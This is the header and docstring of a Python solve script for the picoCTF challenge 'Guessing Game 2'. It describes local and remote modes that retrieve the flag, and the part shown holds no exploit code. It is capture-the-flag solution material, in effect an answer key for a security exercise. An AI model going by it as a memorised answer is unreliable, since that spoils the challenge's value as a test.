#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the picoCTF challenge Guessing Game 2.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
